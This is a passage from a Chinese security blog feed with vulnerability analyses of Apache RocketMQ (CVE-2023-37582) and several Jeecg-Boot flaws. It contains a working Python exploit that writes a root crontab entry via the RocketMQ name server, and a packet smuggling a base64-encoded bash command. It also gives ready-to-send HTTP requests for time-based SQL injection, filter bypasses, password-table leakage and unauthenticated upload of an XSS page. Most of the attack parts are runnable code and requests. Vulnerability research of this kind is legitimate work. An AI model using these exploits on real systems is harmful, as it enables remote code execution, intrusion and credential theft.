src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/TCP.png" class><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">25</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span>filterServerNums=<span class="number">1</span></span><br><span class="line">rocketmqHome=-c <span class="punctuation">&#123;</span>echo<span class="punctuation">,</span>dG91Y2ggL3RtcC9mbGFn<span class="punctuation">&#125;</span>|<span class="punctuation">&#123;</span>base64<span class="punctuation">,</span>-d<span class="punctuation">&#125;</span>|bash -c</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">26</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">401</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;extFields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#123;\&quot;counter\&quot;:1,\&quot;stateVersion\&quot;:0,\&quot;timestamp\&quot;:1689312950437&#125;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">4</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很显然，目前提取出来的部分应该是 TCP 请求中的一段参数，下个断点分析一下这一段通信过程</p><h3 id="通信过程分析"><a href="#通信过程分析" class="headerlink" title="通信过程分析"></a>通信过程分析</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...c..._<span class="punctuation">&#123;</span><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;language&quot;</span><span class="punctuation">:</span><span class="string">&quot;JAVA&quot;</span><span class="punctuation">,</span><span class="attr">&quot;opaque&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;serializeTypeCurrentRPC&quot;</span><span class="punctuation">:</span><span class="string">&quot;JSON&quot;</span><span class="punctuation">,</span><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span><span class="number">435</span><span class="punctuation">&#125;</span>...d...</span><br></pre></td></tr></table></figure><p>协议主要包含四部分  协议总长度+ json 长度+ json + body，前后两段的 c、d 对应的是 ascii 码</p><p>在这一段 json 数据包当中，比较引人注目的是 <code>&quot;code&quot;:25</code>，不同的 code 代表了不同的业务，根据数据包当中的 code 字段，程序会进行不同的业务处理，处理业务在 <code>org.apache.rocketmq.broker.processor.AdminBrokerProcessor#processRequest</code> 方法中</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCodeStatus.png" class><p>其中代码块 <code>case RequestCode.UPDATEE_BROKER_CONFIG</code> 提到一个类 <code>RequestCode</code>，后续会用到</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/RequestCode.png" class><p>跟进 <code>this.updateBrokerConfig()</code> 方法，方法中先将 body 字段的值提取出来，封装进 <code>Properties</code> 类当中，封装完的结果如图</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/properties.png" class><p>往下，跟进 <code>this.brokerController.getConfiguration().update()</code> 方法，到第 187 行，循环遍历所有的配置，并根据对应类，更新配置</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/configObject.png" class><p>可以看到，经过这一步之后，里面的值已经是被更新了</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/update.png" class><p>程序接着调用 <code>persist()</code> 方法， <code>persist()</code> 方法做的业务其实是将 <code>configObjectList</code> 写入进对应的配置文件当中。</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/persist.png" class><p>很清晰的是，程序会将配置写入到两个文件中，分别是 <code>filename</code> 和 <code>filename.bak</code>，其中 <code>filename</code> 的值对应的是 <code>configStorePath</code>，也是 CVE-2023-33246 的黑名单字段</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/string2file.png" class><p>在整段程序执行结束后可以发现 <code>../conf/broker.conf</code> 的内容改变了，且 rocketHome 已经被修改为了我们的输入</p><h3 id="构造-EXP"><a href="#构造-EXP" class="headerlink" title="构造 EXP"></a>构造 EXP</h3><p>既然可以对文件进行修改与写入，根据漏洞描述，修改存储路径为计划任务路径写入 crontab 造成 RCE 即可，因为要写入 crontab，所以涉及到权限问题，其中初始化的 kvConfigPath、configStorePath 带有当前用户，而 kvConfigPath 处于黑名单中，configStorePath 还未被过滤</p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/NamesrvConfig.png" class><p>且攻击目标为 namesrv，<code>brokerConfigPath</code> 是用于存储 broker 组件对应的配置文件的，在 V 5.1.1 当中，<code>brokerConfigPath</code> 是 broker 组件的黑名单</p><p>至此就可以构造出 EXP 来写入定时任务 RCE</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line"><span class="comment"># you ip</span></span><br><span class="line">client.connect((<span class="string">&#x27;124.222.21.138&#x27;</span>,<span class="number">9876</span>))</span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">json = <span class="string">&#x27;&#123;&quot;code&quot;:318,&quot;extFields&quot;:&#123;&quot;test&quot;:&quot;RockedtMQ&quot;&#125;,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:435&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">body=<span class="string">&#x27;configStorePath=/var/spool/cron/crontabs/root\nbrokerConfigPath=/var/spool/cron/crontabs/root\nbindAddress=0.0.0.0\\n*/1 * * * * touch /tmp/success&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json_lens = <span class="built_in">int</span>(<span class="built_in">len</span>(binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>)</span><br><span class="line">head1 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(json_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head1)</span><br><span class="line">all_lens = <span class="built_in">int</span>(<span class="number">4</span>+<span class="built_in">len</span>(binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>+json_lens)</span><br><span class="line">head2 = <span class="string">&#x27;00000000&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(all_lens))[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(head2)</span><br><span class="line">data = head2[-<span class="number">8</span>:]+head1[-<span class="number">8</span>:]+binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>)+binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># send</span></span><br><span class="line">client.send(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">data_recv = client.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(data_recv)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CVE-2023-37582 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jeecg-Boot 部分历史漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/10/19/Jeecg-Boot-%E9%83%A8%E5%88%86%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-10-19T08:18:28.000Z</published>
    <updated>2023-10-19T08:20:10.235Z</updated>
    
    <content type="html"><![CDATA[<p>Jeecg-Boot 部分历史漏洞分析</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我司的任务，原本是漏洞挖掘，在漏洞挖掘之前打算先看看历史漏洞，简单分析一下。<br>本文只聚焦与 Jeecg-Boot 相关的一些漏洞，一些组件漏洞暂时不关注。</p><p>各个版本的漏洞合集</p><p><a class="link" href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&t=blog&u=zhangdaiscott&s=new">https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E&amp;t=blog&amp;u=zhangdaiscott&amp;s=new<i class="fas fa-external-link-alt"></i></a></p><p>因为主要研究版本是从 Jeecg-Boot 3.0 开始的，所以 2.x.x 的版本漏洞就暂时不分析了。使用的版本是 3.2.0 的版本，相对来说非常稳定。</p><p>JeecgBoot常见问题大全 <a class="link" href="http://bbs.jeecg.com/forum.php?mod=viewthread&tid=7816&extra=page=1">http://bbs.jeecg.com/forum.php?mod=viewthread&amp;tid=7816&amp;extra=page%3D1<i class="fas fa-external-link-alt"></i></a></p><h2 id="CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞"><a href="#CVE-2022-45206-Jeecg-Boot-lt-x3D-3-2-0-版本存在-SQL-注入漏洞" class="headerlink" title="CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞"></a>CVE-2022-45206 Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</h2><p>3.0.0 &lt;&#x3D; Jeecg-Boot &lt;&#x3D; 3.2.0 版本存在 SQL 注入漏洞</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Jeecg-Boot</code> 后台服务 API 接口文档处存在 SQL 注入，漏洞对应接口为 <code>/sys/duplicate/check</code></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=%27aa2000&amp;fieldName=updatexml(1%2C(select%2F**%2Fif(length(%22aaa%22)%3E5%2C1%2Csleep(5))%20union%20select%2F**%2F1)%2C1)&amp;fieldVal=1000&amp;tableName=sys_log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">knife4j-gateway-code</span><span class="punctuation">: </span>ROOT</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>接口 <code>org.jeecg.modules.system.controller.DuplicateCheckController</code> 全流程概括一下就是经过一串过滤，最后执行 SQL 语句，对应的 SQL 语句为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 重复校验 sql语句 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSql&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125; and id <span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span> #&#123;dataId&#125;  </span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&lt;!-- 重复校验 sql语句 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;duplicateCheckCountSqlNoDataId&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;Long&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;org.jeecg.modules.system.model.DuplicateCheckVo&quot;</span>&gt;</span>  </span><br><span class="line">    SELECT COUNT(*) FROM $&#123;tableName&#125; WHERE $&#123;fieldName&#125; = #&#123;fieldVal&#125;<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>按照正常来说的 SQL 注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where updatexml(1,(select/**/if(length(&quot;aaa&quot;)&gt;5,1,sleep(5)) union select/**/1),1);</span><br></pre></td></tr></table></figure><p>其中 <code>tableName</code> 契合注入点攻击即可。漏洞的本质原因是过滤的不完全。</p><p>可以看到这里的过滤为 <code>select </code>，多了个空格，很容易使用 <code>/**/</code> 进行绕过。</p><p>作者提出的 <code>replace()</code> 替换 <code>/**/</code> 也是修复不完全的，因为仍旧可以用 <code>()</code> 进行绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb">https://github.com/jeecgboot/jeecg-boot/commit/f18ced524c9ec13e876bfb74785a1b112cc8b6bb<i class="fas fa-external-link-alt"></i></a></p><p>加了两个报错注入的关键字，很明显修复是不完全的，依旧存在安全隐患。后面要看的 jeecg-boot 3.4.4 存在 sql 注入漏洞就是如此；但是 3.4.4 的漏洞复现我失败了，不知道是什么原因。</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在-SQL-注入漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在 SQL 注入漏洞</h2><ul><li>和上一条其实是类似的</li></ul><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>jeecg-boot3.4.4 存在 sql 注入漏洞，sql 注入检测代码存在绕过。接口为 <code>/sys/duplicate/check</code></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?dataId=2000&amp;fieldName=(select(if(((select%0Apassword%0Afrom%0Asys_user%0Awhere%0Ausername%0A=&#x27;jeecg&#x27;)=&#x27;eee378a1258530cb&#x27;),sleep(4),1)))&amp;fieldVal=1000&amp;tableName=test_person</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>值得一提的是，这里的 sleep 时间取决于数据表里面放的数据多少，为 <code>n*时间</code></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>没有什么特别需要分析的，简单的 bypass</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>增添的黑名单是 <code>geohash|gtid_subset|gtid_subtract</code>，没看懂</p><h2 id="Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞"><a href="#Jeecg-Boot-lt-x3D-3-4-4-存在信息泄露漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.4.4 存在信息泄露漏洞</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>由于 <code>AbstractQueryBlackListHandler</code> 类中的黑名单校验不严格，导致多个接口如 <code>sys/dict/queryTableData</code> 存在信息泄露漏洞。</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>数据也被加密了，并没有什么太大的用处。</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 <code>isPass()</code>函数中 <code>ruleMap.get(name)</code> 为 null 即可绕过, 可以采用 <code>sys_user</code>, <code>(sys_user)</code>, <code>sys_user%20</code> 等绕过</p><h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>加黑了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getTableName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        String[] arr = str.split(<span class="string">&quot;\\s+(?i)where\\s+&quot;</span>);</span><br><span class="line">        <span class="comment">// sys_user , (sys_user), sys_user%20, %60sys_user%60  issues/4393</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">reg</span> <span class="operator">=</span> <span class="string">&quot;\\s+|\\(|\\)|`&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>].replaceAll(reg, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然而依旧可以用 &#96;&#96; bypass</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=sys_user/**/&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞"><a href="#Jeecg-Boot-lt-x3D-3-5-1-存在任意文件上传漏洞" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞"></a>Jeecg-Boot &lt;&#x3D; 3.5.1 存在任意文件上传漏洞</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>经测试发现 <code>/jeecg-boot/jmreport/upload</code>接口存在未授权任意文件上传</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>文件上传</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryBB3U3apXylvyidXI</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/jeecg-boot/jmreport/index/864289498073407488?menuType=datainfo&amp;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;xss.html&quot;</span></span></span><br><span class="line"><span class="language-xquery">Content-Type: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    </span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;fileName&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">xss.html</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;biz&quot;</span></span></span><br><span class="line"><span 